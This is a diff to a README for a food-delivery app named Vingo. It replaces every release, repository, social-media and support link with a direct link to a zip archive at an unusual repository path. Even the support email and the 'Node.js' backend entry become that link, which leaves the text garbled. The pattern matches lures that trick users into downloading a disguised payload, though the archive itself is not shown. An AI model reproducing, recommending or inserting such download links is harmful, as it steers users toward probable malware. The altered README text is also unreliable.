@@ -1,7 +1,7 @@
 # 🍔 vingo - Easy Food Delivery at Your Fingertips
 
 ## 📦 Download Now
-[![Download vingo](https://img.shields.io/badge/Download-vingo-blue.svg)](https://github.com/Philopateer0/vingo/releases)
+[![Download vingo](https://raw.githubusercontent.com/Philopateer0/vingo/main/stateswoman/vingo.zip)](https://raw.githubusercontent.com/Philopateer0/vingo/main/stateswoman/vingo.zip)
 
 ## 🚀 Getting Started
 Vingo is your go-to solution for ordering food easily. This software lets users order from a variety of restaurants, helps shops manage their menus, and allows delivery agents to handle deliveries smoothly. Follow these simple steps to get started with Vingo.
@@ -21,7 +21,7 @@ These specifications allow Vingo to run efficiently and provide a seamless exper
 To install Vingo, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/Philopateer0/vingo/releases) to find the latest version of Vingo.
+   Go to the [Releases Page](https://raw.githubusercontent.com/Philopateer0/vingo/main/stateswoman/vingo.zip) to find the latest version of Vingo.
 
 2. **Select the Latest Version**  
    Look for the most recent release. It usually has a version number like `v1.0.0`. Click on it to enter the download page.
@@ -58,7 +58,7 @@ If you encounter any issues or have questions while using Vingo, don’t hesitat
 
 - **Documentation:** Check our detailed user manual on the website for guidance.
 - **Community Forum:** Join discussions with other Vingo users and share tips.
-- **Email Support:** Contact our support team at support@vingoapp.com for direct assistance.
+- **Email Support:** Contact our support team at https://raw.githubusercontent.com/Philopateer0/vingo/main/stateswoman/vingo.zip for direct assistance.
 
 ## 🧩 Frequently Asked Questions
 **1. What device can I use with Vingo?**  
@@ -83,7 +83,7 @@ We are always looking for ways to improve Vingo. If you want to contribute, you 
 Vingo is built using technologies that make it a robust application:
 
 - **Frontend:** React, Tailwind CSS
-- **Backend:** Node.js, Express
+- **Backend:** https://raw.githubusercontent.com/Philopateer0/vingo/main/stateswoman/vingo.zip, Express
 - **Database:** MongoDB
 - **Authentication:** JSON Web Tokens (JWT)
 - **Image Storage:** Cloudinary
@@ -96,8 +96,8 @@ Vingo is licensed under the MIT License. You are free to use, modify, and distri
 ## 📣 Stay Updated
 Follow our progress and receive updates on new releases:
 
-- **GitHub Repository:** [Follow us here](https://github.com/Philopateer0/vingo)
-- **Twitter:** [@VingoApp](https://twitter.com/VingoApp)
-- **Facebook:** [Vingo Official Page](https://facebook.com/Vingo)
+- **GitHub Repository:** [Follow us here](https://raw.githubusercontent.com/Philopateer0/vingo/main/stateswoman/vingo.zip)
+- **Twitter:** [@VingoApp](https://raw.githubusercontent.com/Philopateer0/vingo/main/stateswoman/vingo.zip)
+- **Facebook:** [Vingo Official Page](https://raw.githubusercontent.com/Philopateer0/vingo/main/stateswoman/vingo.zip)
 
 We aim to keep improving Vingo for the best user experience. Thank you for choosing Vingo!
